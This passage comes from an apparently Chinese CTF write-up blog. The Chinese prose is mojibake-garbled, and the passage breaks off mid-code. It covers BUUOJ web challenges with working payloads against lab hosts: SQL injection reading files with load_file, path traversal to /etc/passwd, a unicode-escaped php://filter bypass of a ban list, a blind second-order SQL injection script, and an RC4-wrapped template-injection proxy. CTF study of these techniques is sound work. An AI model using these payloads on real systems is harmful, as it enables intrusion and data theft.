00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000104445344420000000100000000000000000000000000000000000000000000000200000020000000600000000000000001000000800000000100000100000000010000020000000000000000020000080000001800000000000000000100002000000000010000400000000001000080000000000100010000000000010002000000000001000400000000000100080000000000010010000000000001002000000000000100400000000000010080000000000001010000000000000102000000000000010400000000000001080000000000000110000000000000012000000000000001400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>fâ€lâ€aâ€gâ€_â€8â€9â€4â€6â€eâ€1â€fâ€fâ€1â€eâ€eâ€3â€eâ€4â€0â€fâ€.â€pâ€hâ€p
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>title<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span><span style=color:#f92672>&amp;</span>category<span style=color:#f92672>=</span>a<span style=color:#e6db74>&#39;,content=(select HEX(load_file(&#34;/var/www/html/flag_8946e1ff1ee3e40f.php&#34;))),/*&amp;content=123
</span></span></span></code></pre></div><pre tabindex=0><code>3C3F7068700A0924666C61673D22666C61677B37323965663932662D326265332D346531632D623631382D6634303434303031323661627D223B0A3F3E0A
#flag{729ef92f-2be3-4e1c-b618-f404400126ab}
</code></pre><p>æ¯æ¬¡éƒ½éœ€è¦åœ¨comment.phpé‡Œé¢è¾“å…¥<code>*/#</code>è¿›è¡Œæ‹¼æ¥ï¼Œæœ€åå¾—åˆ°flag,è¿™é¢˜è´¨é‡è¿˜æ˜¯æŒºé«˜çš„</p><h2 id=ç½‘é¼æ¯-2020-åŠå†³èµ›alicewebsite>[ç½‘é¼æ¯ 2020 åŠå†³èµ›]AliceWebsite</h2><p>æœ‰æºç ï¼Œå…ˆä¸‹è½½çœ‹çœ‹ï¼Œèƒ½è¯»å–ä¸œè¥¿</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://85405268-ec05-4ab9-98c6-e9f007339cb8.node5.buuoj.cn:81/index.php?action<span style=color:#f92672>=</span>../../../etc/passwd
</span></span></code></pre></div><pre tabindex=0><code>http://85405268-ec05-4ab9-98c6-e9f007339cb8.node5.buuoj.cn:81/index.php?action=../../../flag
</code></pre><h2 id=harekazectf2019encode_and_encode>[HarekazeCTF2019]encode_and_encode</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;source&#39;</span>])) {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>show_source</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>exit</span>();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>is_valid</span>($str) {
</span></span><span style=display:flex><span>  $banword <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#75715e>// no path traversal
</span></span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;\.\.&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#75715e>// no stream wrapper
</span></span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;(php|file|glob|data|tp|zip|zlib|phar):&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#75715e>// no data exfiltration
</span></span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;flag&#39;</span>
</span></span><span style=display:flex><span>  ];
</span></span><span style=display:flex><span>  $regexp <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/&#39;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>implode</span>(<span style=color:#e6db74>&#39;|&#39;</span>, $banword) <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;/i&#39;</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>($regexp, $str)) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$body <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_get_contents</span>(<span style=color:#e6db74>&#39;php://input&#39;</span>);
</span></span><span style=display:flex><span>$json <span style=color:#f92672>=</span> <span style=color:#a6e22e>json_decode</span>($body, <span style=color:#66d9ef>true</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>is_valid</span>($body) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>isset</span>($json) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>isset</span>($json[<span style=color:#e6db74>&#39;page&#39;</span>])) {
</span></span><span style=display:flex><span>  $page <span style=color:#f92672>=</span> $json[<span style=color:#e6db74>&#39;page&#39;</span>];
</span></span><span style=display:flex><span>  $content <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_get_contents</span>($page);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>$content <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>is_valid</span>($content)) {
</span></span><span style=display:flex><span>    $content <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&lt;p&gt;not found&lt;/p&gt;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>  $content <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&lt;p&gt;invalid request&lt;/p&gt;&#39;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// no data exfiltration!!!
</span></span></span><span style=display:flex><span>$content <span style=color:#f92672>=</span> <span style=color:#a6e22e>preg_replace</span>(<span style=color:#e6db74>&#39;/HarekazeCTF\{.+\}/i&#39;</span>, <span style=color:#e6db74>&#39;HarekazeCTF{&amp;lt;censored&amp;gt;}&#39;</span>, $content);
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>json_encode</span>([<span style=color:#e6db74>&#39;content&#39;</span> <span style=color:#f92672>=&gt;</span> $content]);
</span></span></code></pre></div><p>å¤§é¢˜æ€è·¯æ˜¯è¯»å–å§</p><p>ç”¨unicodeè¿›è¡Œç»•è¿‡</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{<span style=color:#f92672>&#34;page&#34;</span>:<span style=color:#e6db74>&#34;\u0070\u0068\u0070\u003A\u002F\u002F\u0066\u0069\u006C\u0074\u0065\u0072\u002F\u0063\u006F\u006E\u0076\u0065\u0072\u0074\u002E\u0062\u0061\u0073\u0065\u0036\u0034\u002D\u0065\u006E\u0063\u006F\u0064\u0065\u002F\u0072\u0065\u0073\u006F\u0075\u0072\u0063\u0065\u003D\u002F\u0066\u006C\u0061\u0067&#34;</span>}
</span></span></code></pre></div><h2 id=ç½‘é¼æ¯2018unfinish>[ç½‘é¼æ¯2018]Unfinish</h2><p>å…¸å‹çš„äºŒæ¬¡æ³¨å…¥åœ¨register.phpå’Œlogin.phpé‡Œåå¤æ¨ªè·³</p><p>å¥½æ¶å¿ƒ</p><p>å‚è€ƒé“¾æ¥[<a href=https://blog.csdn.net/m0_69151365/article/details/140912171>ç½‘é¼æ¯2018]Unfinishè§£é¢˜ï¼Œäº”åˆ†é’Ÿå¸¦ä½ è§£é¢˜-CSDNåšå®¢</a>ï¼Œæœ‰ç‚¹ç´¯æŒ‰ç…§è¿™ä¸ªæ€è·¯æ¥</p><p>å…ˆè®²æ€è·¯</p><p>å…ˆå»æ³¨å†Œï¼Œè¾“å…¥email,username,password,ç„¶åç™»å½•ç•Œé¢éœ€è¦çš„æ˜¯emailå’Œpassword,æœ€åæ˜¾ç¤ºçš„æ˜¯username,æ³¨å…¥ç‚¹æ˜¯username</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>insert</span> <span style=color:#66d9ef>into</span> tables <span style=color:#66d9ef>values</span>(<span style=color:#e6db74>&#39;$email&#39;</span>,<span style=color:#e6db74>&#39;$username&#39;</span>,<span style=color:#e6db74>&#39;$password&#39;</span>)
</span></span></code></pre></div><p>æ‰€ä»¥éœ€è¦æ³¨å…¥ä¸­é—´è¿™ä¸ªç‚¹</p><p>é€šè¿‡æ•°å­—æ‹¼æ¥é¿å…äº† SQL æ³¨å…¥æ—¶å¸¸è§çš„é—­åˆå¼•å·é—®é¢˜ã€‚ç›´æ¥æ’å…¥å¼•å·å¯èƒ½ä¼šç ´åæŸ¥è¯¢ç»“æ„ï¼Œä½†é€šè¿‡ä½¿ç”¨ <code>+</code> è¿ç®—ç¬¦ï¼Œæ”»å‡»è€…å¯ä»¥æ“æ§æŸ¥è¯¢ï¼Œè€Œä¸éœ€è¦ç›´æ¥æ’å…¥å¼•å·ã€‚</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>0</span><span style=color:#e6db74>&#39; +(select ascii(database())) +&#39;</span><span style=color:#ae81ff>0</span>
</span></span></code></pre></div><p>æµ‹è¯•ä¸€ä¸‹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>0</span><span style=color:#e6db74>&#39;+(select ascii(substr (database(),2,1)))+&#39;</span><span style=color:#ae81ff>0</span>
</span></span></code></pre></div><p>å‘ç°ä¸€ä¸‹waf,è¿‡æ»¤äº†é€—å·ï¼Œinformationç­‰</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>substr(<span style=color:#66d9ef>database</span>() <span style=color:#66d9ef>from</span> <span style=color:#ae81ff>2</span> <span style=color:#66d9ef>for</span> <span style=color:#ae81ff>1</span>)<span style=color:#960050;background-color:#1e0010>ï¼šè¿™ä¸ªéƒ¨åˆ†ä¼šä»æ•°æ®åº“åç§°çš„ç¬¬äºŒä¸ªå­—ç¬¦å¼€å§‹</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># -*- coding:utf-8 -*-</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Author: 0raN9e</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> time
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> bs4 <span style=color:#f92672>import</span> BeautifulSoup
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>url<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;http://fe499958-7c4c-48f3-a18a-78ec7d81f8c3.node5.buuoj.cn:81/&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>register_url<span style=color:#f92672>=</span>url<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;register.php&#34;</span>
</span></span><span style=display:flex><span>login_url<span style=color:#f92672>=</span>url<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;login.php&#34;</span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>50</span>):
</span></span><span style=display:flex><span>    <span style=color:#75715e>#payload=f&#34;0&#39;+(select ascii(substr(database()from {i} for 1)))+&#39;0 &#34;# web</span>
</span></span><span style=display:flex><span>    payload<span style=color:#f92672>=</span><span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;0&#39;+(ascii(substr((select * from flag) from </span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74> for 1)))+&#39;0&#34;</span><span style=color:#75715e># çŒœ???</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    data_register<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>            <span style=color:#75715e>#&#34;email&#34;: f&#34;{i}@gmail.com&#34;,</span>
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;email&#34;</span>: <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74>@163.com&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;username&#34;</span>: payload,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;password&#34;</span>: <span style=color:#e6db74>&#34;1&#34;</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    register<span style=color:#f92672>=</span>requests<span style=color:#f92672>.</span>post(url<span style=color:#f92672>=</span>register_url,data<span style=color:#f92672>=</span>data_register)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    data_login<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>            <span style=color:#75715e>#&#34;email&#34;: f&#34;{i}@gmail.com&#34;,</span>
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;email&#34;</span>: <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74>@163.com&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;password&#34;</span>: <span style=color:#e6db74>&#34;1&#34;</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    login<span style=color:#f92672>=</span>requests<span style=color:#f92672>.</span>post(url<span style=color:#f92672>=</span>login_url,data<span style=color:#f92672>=</span>data_login)
</span></span><span style=display:flex><span>    html <span style=color:#f92672>=</span> login<span style=color:#f92672>.</span>text
</span></span><span style=display:flex><span>    soup <span style=color:#f92672>=</span> BeautifulSoup(html, <span style=color:#e6db74>&#39;html.parser&#39;</span>)
</span></span><span style=display:flex><span>    text1 <span style=color:#f92672>=</span> soup<span style=color:#f92672>.</span>find(<span style=color:#e6db74>&#39;span&#39;</span>, class_<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;user-name&#39;</span>)
</span></span><span style=display:flex><span>    ans <span style=color:#f92672>=</span> text1<span style=color:#f92672>.</span>text
</span></span><span style=display:flex><span>    f <span style=color:#f92672>=</span> int(ans)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> f <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>    flag <span style=color:#f92672>+=</span> chr(int(ans))
</span></span><span style=display:flex><span>    print(flag)
</span></span></code></pre></div><p>ç½‘ä¸Šéƒ½æ²¡è®²å¥½æ€ä¹ˆçˆ†è¡¨ï¼Œéƒ½æ˜¯ç›´æ¥çŒœçš„ï¼Œæˆ‘ä¹Ÿé¡ºä»å§</p><h2 id=ciscn2019-åä¸œå—èµ›åŒºdouble-secret>[CISCN2019 åä¸œå—èµ›åŒº]Double Secret</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://7dbd6100-4acb-4408-8e1a-719e7725218f.node5.buuoj.cn:81/robots.txt
</span></span><span style=display:flex><span>It is Android ctf
</span></span></code></pre></div><p>æ¢äº†uaå¤´æ²¡æœ‰æ˜¾ç¤º</p><pre tabindex=0><code>http://7dbd6100-4acb-4408-8e1a-719e7725218f.node5.buuoj.cn:81/secret
Tell me your secret.I will encrypt it so others can&#39;t see
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://7dbd6100-4acb-4408-8e1a-719e7725218f.node5.buuoj.cn:81/secret?secret=&#34;</span>
</span></span><span style=display:flex><span>ans <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>500</span>):
</span></span><span style=display:flex><span>    res <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url <span style=color:#f92672>+</span> str(i))
</span></span><span style=display:flex><span>    ans <span style=color:#f92672>+=</span> res<span style=color:#f92672>.</span>text<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>    print(ans)
</span></span></code></pre></div><p>æ²¡æœ‰å¤´ç»ªç›´æ¥æ”¾å¤§</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://7dbd6100-4acb-4408-8e1a-719e7725218f.node5.buuoj.cn:81/secret?secret<span style=color:#f92672>=</span><span style=color:#ae81ff>333333333333</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>File <span style=color:#e6db74>&#34;/app/app.py&#34;</span>, line <span style=color:#ae81ff>35</span>, <span style=color:#f92672>in</span> secret
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(secret<span style=color:#f92672>==</span><span style=color:#66d9ef>None</span>):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;Tell me your secret.I will encrypt it so others can</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>t see&#39;</span>
</span></span><span style=display:flex><span>    rc<span style=color:#f92672>=</span>rc4_Modified<span style=color:#f92672>.</span>RC4(<span style=color:#e6db74>&#34;HereIsTreasure&#34;</span>)   <span style=color:#75715e>#è§£å¯†</span>
</span></span><span style=display:flex><span>    deS<span style=color:#f92672>=</span>rc<span style=color:#f92672>.</span>do_crypt(secret)
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>    a<span style=color:#f92672>=</span>render_template_string(safe(deS))
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;ciscn&#39;</span> <span style=color:#f92672>in</span> a<span style=color:#f92672>.</span>lower():
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;flag detected!&#39;</span>
</span></span><span style=display:flex><span>Open an interactive python shell <span style=color:#f92672>in</span> this frame    <span style=color:#66d9ef>return</span> a
</span></span></code></pre></div><p>æ³¨æ„pythonçš„ç‰ˆæœ¬æ˜¯2.7,å¤§ä½“åº”è¯¥æ˜¯é€šè¿‡è¿™ä¸ªrc4åŠ å¯†ä¸€ä¸‹ç„¶åæ¨¡æ¿æ³¨å…¥,å‰é˜µå­çœ‹äº†zacarxå¸ˆå‚…çš„fenjingé…åˆé£Ÿç”¨çš„è‡ªå·±ä¹Ÿå†™ä¸€ä¸ªçœ‹çœ‹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> urllib.parse <span style=color:#f92672>import</span> quote
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, request
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>rc4_main</span>(key<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;init_key&#34;</span>, message<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;init_message&#34;</span>):
</span></span><span style=display:flex><span>    s_box <span style=color:#f92672>=</span> rc4_init_sbox(key)
</span></span><span style=display:flex><span>    crypt <span style=color:#f92672>=</span> rc4_excrypt(message, s_box)
</span></span><span style=display:flex><span>    url_encoded <span style=color:#f92672>=</span> quote(crypt, safe<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;URL ç¼–ç ç»“æœï¼š&#34;</span>, url_encoded)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> url_encoded
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>rc4_init_sbox</span>(key):
</span></span><span style=display:flex><span>    s_box <span style=color:#f92672>=</span> list(range(<span style=color:#ae81ff>256</span>))
</span></span><span style=display:flex><span>    j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    key_length <span style=color:#f92672>=</span> len(key)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>256</span>):
</span></span><span style=display:flex><span>        j <span style=color:#f92672>=</span> (j <span style=color:#f92672>+</span> s_box[i] <span style=color:#f92672>+</span> ord(key[i <span style=color:#f92672>%</span> key_length])) <span style=color:#f92672>%</span> <span style=color:#ae81ff>256</span>
</span></span><span style=display:flex><span>        s_box[i], s_box[j] <span style=color:#f92672>=</span> s_box[j], s_box[i]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> s_box
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>rc4_excrypt</span>(plain, box):
</span></span><span style=display:flex><span>    res <span style=color:#f92672>=</span> bytearray()
</span></span><span style=display:flex><span>    i <span style=color:#f92672>=</span> j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> s <span style=color:#f92672>in</span> plain:
</span></span><span style=display:flex><span>        i <span style=color:#f92672>=</span> (i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>%</span> <span style=color:#ae81ff>256</span>
</span></span><span style=display:flex><span>        j <span style=color:#f92672>=</span> (j <span style=color:#f92672>+</span> box[i]) <span style=color:#f92672>%</span> <span style=color:#ae81ff>256</span>
</span></span><span style=display:flex><span>        box[i], box[j] <span style=color:#f92672>=</span> box[j], box[i]
</span></span><span style=display:flex><span>        t <span style=color:#f92672>=</span> (box[i] <span style=color:#f92672>+</span> box[j]) <span style=color:#f92672>%</span> <span style=color:#ae81ff>256</span>
</span></span><span style=display:flex><span>        k <span style=color:#f92672>=</span> box[t]
</span></span><span style=display:flex><span>        res<span style=color:#f92672>.</span>append(ord(s) <span style=color:#f92672>^</span> k)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> res<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;latin1&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__)
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://7dbd6100-4acb-4408-8e1a-719e7725218f.node5.buuoj.cn:81/secret?secret=&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>():
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;name&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;æ¥æ”¶åˆ°çš„payloadï¼š&#34;</span>, payload)
</span></span><span style=display:flex><span>    ans <span style=color:#f92672>=</span> rc4_main(<span style=color:#e6db74>&#34;HereIsTreasure&#34;</span>, payload)
</span></span><span style=display:flex><span>    res <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url<span style=color:#f92672>+</span>ans)
</span></span><span style=display:flex><span>    print(url<span style=color:#f92672>+</span>ans)
</span></span><span style=display:flex><span>    res_text <span style=color:#f92672>=</span> res<span style=color:#f92672>.</span>text
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;è¿”å›ç»“æœï¼š&#34;</span>, res_text)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> res_text
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>run(host<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;0.0.0.0&#39;</span>, port<span style=color:#f92672>=</span><span style=color:#ae81ff>5000</span>, debug<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span></code></pre></div><p>èµ·ä¸ªfenjingå¯ä»¥ç›´æ¥è·‘ï¼Œæœ¬é¢˜ä¸»è¦ç”±äºwafå°‘ï¼Œå¦‚æœwafå¤šå¤–åŠ è¿™ä¸ªç¼–ç åŠ å¯†çš„è¯ï¼Œè¿™ä¸ªè„šæœ¬å¯èƒ½æ¯”è¾ƒå¯é£Ÿç”¨</p><h2 id=suctf-2019easyweb>[SUCTF 2019]EasyWeb</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>get_the_flag</span>(){
</span></span><span style=display:flex><span>    <span style=color:#75715e>// webadmin will remove your upload file every 20 min!!!! 
</span></span></span><span style=display:flex><span>    $userdir <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;upload/tmp_&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>md5</span>($_SERVER[<span style=color:#e6db74>&#39;REMOTE_ADDR&#39;</span>]);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>file_exists</span>($userdir)){
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>mkdir</span>($userdir);
</span></span><span style=display:flex><span>    }
